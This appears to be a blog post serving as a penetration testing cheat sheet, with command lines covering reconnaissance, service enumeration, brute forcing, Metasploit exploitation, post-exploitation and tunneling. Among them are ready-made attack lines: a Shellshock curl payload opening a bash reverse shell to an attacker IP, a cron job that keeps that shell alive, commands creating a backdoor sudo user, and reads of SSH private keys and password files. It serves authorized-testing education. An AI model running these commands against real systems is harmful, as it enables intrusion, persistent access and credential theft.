---
title: Network Penetration Testing Guide
published: 2026-01-18
description: 'Comprehensive guide covering network reconnaissance, enumeration, and exploitation techniques for penetration testing'
image: ''
tags: [Network, Pentesting, Enumeration, Exploitation]
category: 'Notes'
draft: false
---

# Network Penetration Testing Guide

A comprehensive guide covering the full lifecycle of network penetration testing, from reconnaissance to post-exploitation.

## Reconnaissance Phase

### Passive Reconnaissance

#### OSINT Gathering
```bash
# DNS enumeration
whois target.com
nslookup target.com
dig target.com ANY

# Certificate transparency logs
# https://crt.sh/?q=%.target.com

# Google dorking
site:target.com
site:target.com filetype:pdf
site:target.com inurl:admin

# Shodan - Internet-connected devices
shodan search "org:target"

# theHarvester - Email/subdomain gathering
theHarvester -d target.com -b all
```

#### Subdomain Enumeration
```bash
# Sublist3r
python3 sublist3r.py -d target.com

# Amass
amass enum -d target.com

# Subfinder
subfinder -d target.com -o subdomains.txt

# Assetfinder
assetfinder target.com

# DNS bruteforce
dnsrecon -d target.com -t brt -D /usr/share/wordlists/dnsmap.txt
```

### Active Reconnaissance

#### Network Scanning
```bash
# Ping sweep
nmap -sn 192.168.1.0/24
fping -a -g 192.168.1.0/24 2>/dev/null

# ARP scan (local network)
arp-scan -l
netdiscover -r 192.168.1.0/24
```

## Port Scanning & Enumeration

### Nmap - The Network Scanner

#### Basic Scans
```bash
# Quick scan
nmap -T4 -F target.com

# Full port scan
nmap -p- target.com

# Top 1000 ports
nmap target.com

# Specific ports
nmap -p 22,80,443 target.com

# Service version detection
nmap -sV target.com

# OS detection
nmap -O target.com

# Aggressive scan
nmap -A target.com

# Script scan
nmap -sC target.com
```

#### Advanced Scans
```bash
# Stealth SYN scan
nmap -sS target.com

# UDP scan
nmap -sU target.com

# Comprehensive scan
nmap -sS -sV -sC -O -p- -T4 target.com -oA full_scan

# Scan through proxychains
proxychains nmap -sT -Pn target.com

# IPv6 scan
nmap -6 target.com
```

#### Nmap Scripts (NSE)
```bash
# List available scripts
ls /usr/share/nmap/scripts/ | grep ftp

# Run specific script
nmap --script=http-enum target.com

# Multiple scripts
nmap --script="smb-*" target.com

# Script with arguments
nmap --script=mysql-brute --script-args userdb=users.txt,passdb=pass.txt target.com

# Vulnerability scanning
nmap --script=vuln target.com
```

### Service Enumeration

#### FTP (Port 21)
```bash
# Nmap scripts
nmap --script=ftp-* -p 21 target.com

# Anonymous login
ftp target.com
# Username: anonymous
# Password: anonymous

# Download all files
wget -r ftp://anonymous:anonymous@target.com
```

#### SSH (Port 22)
```bash
# Banner grabbing
nc target.com 22

# SSH enumeration
nmap --script=ssh-* -p 22 target.com

# Bruteforce (use with caution)
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://target.com

# SSH audit
ssh-audit target.com
```

#### DNS (Port 53)
```bash
# Zone transfer
dig axfr @target.com domain.com
host -l domain.com target.com

# DNS enumeration
nmap --script=dns-* target.com

# DNSenum
dnsenum target.com

# Fierce
fierce --domain target.com
```

#### SMTP (Port 25, 587, 465)
```bash
# Banner grabbing
nc target.com 25

# User enumeration
smtp-user-enum -M VRFY -U users.txt -t target.com

# Nmap scripts
nmap --script=smtp-* -p 25 target.com

# Manual enumeration
telnet target.com 25
VRFY root
EXPN root
```

#### HTTP/HTTPS (Port 80, 443, 8080)
```bash
# Whatweb - Technology detection
whatweb http://target.com

# Nikto - Web scanner
nikto -h http://target.com

# Directory bruteforce
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Virtual host discovery
gobuster vhost -u http://target.com -w subdomains.txt

# SSL/TLS testing
sslscan target.com
testssl.sh target.com

# Nmap HTTP scripts
nmap --script=http-* -p 80 target.com
```

#### SMB (Port 139, 445)
```bash
# Enum4linux - SMB enumeration
enum4linux -a target.com

# Nmap scripts
nmap --script=smb-* -p 445 target.com

# SMBMap
smbmap -H target.com
smbmap -H target.com -u guest

# SMBClient
smbclient -L //target.com
smbclient //target.com/share -U username

# CrackMapExec
crackmapexec smb target.com -u users.txt -p passwords.txt
crackmapexec smb target.com -u '' -p '' --shares

# Check for SMB vulnerabilities
nmap --script=smb-vuln-* -p 445 target.com
```

#### SNMP (Port 161)
```bash
# SNMP enumeration
snmp-check target.com -c public

# SNMPwalk
snmpwalk -v2c -c public target.com

# Onesixtyone - SNMP scanner
onesixtyone -c community_strings.txt target.com

# Nmap scripts
nmap --script=snmp-* -p 161 target.com
```

#### LDAP (Port 389, 636)
```bash
# Nmap scripts
nmap --script=ldap-* -p 389 target.com

# ldapsearch
ldapsearch -x -h target.com -b "dc=domain,dc=com"

# Enumerate users
ldapsearch -x -h target.com -b "dc=domain,dc=com" "(objectClass=user)"
```

#### RDP (Port 3389)
```bash
# Nmap scripts
nmap --script=rdp-* -p 3389 target.com

# rdesktop
rdesktop target.com

# xfreerdp
xfreerdp /v:target.com /u:username /p:password

# RDP bruteforce
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://target.com
```

#### MySQL (Port 3306)
```bash
# Connect
mysql -h target.com -u root -p

# Nmap scripts
nmap --script=mysql-* -p 3306 target.com

# Bruteforce
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://target.com
```

#### MSSQL (Port 1433)
```bash
# Impacket mssqlclient
mssqlclient.py username:password@target.com

# Nmap scripts
nmap --script=ms-sql-* -p 1433 target.com

# Metasploit
use auxiliary/scanner/mssql/mssql_login
```

#### NFS (Port 2049)
```bash
# Show mounted shares
showmount -e target.com

# Mount NFS share
mkdir /tmp/mount
mount -t nfs target.com:/share /tmp/mount

# Nmap scripts
nmap --script=nfs-* -p 2049 target.com
```

## Vulnerability Assessment

### Automated Scanners
```bash
# Nessus - Professional vulnerability scanner
# OpenVAS - Open-source vulnerability scanner
# Nexpose - Vulnerability management

# Nikto for web
nikto -h http://target.com

# WPScan for WordPress
wpscan --url http://target.com --enumerate u,p,t

# Nuclei - Fast vulnerability scanner
nuclei -u http://target.com -t /path/to/templates/
```

### Manual Testing
```bash
# Check for default credentials
# Search exploit-db
searchsploit apache 2.4.49

# Google for known vulnerabilities
# Check CVE databases
```

## Exploitation

### Metasploit Framework
```bash
# Start Metasploit
msfconsole

# Search for exploits
search apache
search type:exploit platform:windows

# Use exploit
use exploit/windows/smb/ms17_010_eternalblue

# Set options
set RHOSTS target.com
set LHOST 10.10.14.5
show options

# Run exploit
exploit
# or
run

# Background session
background

# List sessions
sessions -l

# Interact with session
sessions -i 1
```

### Common Exploits

#### EternalBlue (MS17-010)
```bash
# Using Metasploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target.com
exploit

# Using AutoBlue
python3 eternalblue_exploit7.py target.com
```

#### Shellshock
```bash
# Test for vulnerability
curl -A "() { :; }; echo; echo vulnerable" http://target.com/cgi-bin/test.sh

# Exploit
curl -A "() { :; }; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'" http://target.com/cgi-bin/test.sh
```

### Password Attacks

#### Hydra - Network password cracking
```bash
# SSH
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://target.com

# FTP
hydra -l admin -P passwords.txt ftp://target.com

# HTTP POST
hydra -l admin -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# Multiple users
hydra -L users.txt -P passwords.txt ssh://target.com
```

#### Medusa
```bash
medusa -h target.com -u admin -P passwords.txt -M ssh
```

#### CrackMapExec
```bash
# SMB
crackmapexec smb target.com -u users.txt -p passwords.txt

# WinRM
crackmapexec winrm target.com -u admin -p password
```

### Exploitation Tools
```bash
# SearchSploit - Offline exploit database
searchsploit windows smb
searchsploit -m 42315.py

# Exploit-DB
# https://www.exploit-db.com/

# Packet Storm
# https://packetstormsecurity.com/
```

## Post-Exploitation

### Information Gathering
```bash
# System information
uname -a
hostname
cat /etc/issue

# Network information
ifconfig
ip a
netstat -antup
ss -tunap

# Users
whoami
id
cat /etc/passwd
w
last

# Processes
ps aux
top
```

### Persistence
```bash
# Add SSH key
echo "ssh-rsa KEY..." >> ~/.ssh/authorized_keys

# Create backdoor user
useradd -m backdoor -s /bin/bash
echo 'backdoor:password' | chpasswd
usermod -aG sudo backdoor

# Cron job
(crontab -l ; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'")|crontab -
```

### Lateral Movement
```bash
# SSH key stealing
cat ~/.ssh/id_rsa
cat ~/.ssh/known_hosts

# Credential harvesting
grep -r password /home
grep -r password /var/www

# Process monitoring
./pspy64

# Pivoting with SSH
ssh -L 8080:localhost:80 user@target.com
ssh -D 9050 user@target.com
```

## Pivoting & Tunneling

### SSH Tunneling
```bash
# Local port forwarding
ssh -L 8080:localhost:80 user@target.com

# Remote port forwarding
ssh -R 9090:localhost:3000 user@attacker.com

# Dynamic port forwarding (SOCKS proxy)
ssh -D 9050 user@target.com

# Use with proxychains
# Edit /etc/proxychains.conf: socks4 127.0.0.1 9050
proxychains nmap -sT -Pn internal-target
```

### Chisel - Fast TCP/UDP tunnel
```bash
# On attacker (server)
./chisel server -p 8000 --reverse

# On target (client)
./chisel client attacker-ip:8000 R:1080:socks

# Use with proxychains
proxychains nmap -sT -Pn internal-target
```

### Ligolo-ng - Advanced tunneling
```bash
# On attacker (proxy)
./ligolo-proxy -selfcert

# On target (agent)
./ligolo-agent -connect attacker-ip:11601 -ignore-cert
```

## Documentation & Reporting

### Screenshots
```bash
# Take screenshot
import -window root screenshot.png

# Automated screenshots with Eyewitness
eyewitness --web -f urls.txt
```

### Note-Taking
- CherryTree
- Obsidian
- Notion
- Joplin
- KeepNote

### Reporting Tools
- Dradis Framework
- Serpico
- PlexTrac

## Essential Commands Reference

```bash
# Quick port scan
nmap -sV -sC -oA scan target.com

# Full TCP scan
nmap -sS -sV -sC -p- -T4 -oA full_scan target.com

# UDP scan top 100
nmap -sU --top-ports 100 target.com

# Web directory scan
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt

# Get reverse shell
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1

# Stabilize shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

## Best Practices

1. **Always get proper authorization** before testing
2. **Document everything** - commands, findings, screenshots
3. **Use scope carefully** - don't test out-of-scope systems
4. **Be patient** - enumeration is key
5. **Think like an attacker** - what would you do next?
6. **Keep learning** - technology changes constantly
7. **Stay ethical** - respect boundaries and laws
8. **Verify findings** - avoid false positives
9. **Use version control** for custom tools and scripts
10. **Practice on legal platforms** - HTB, THM, VulnHub

Happy hunting! 🎯
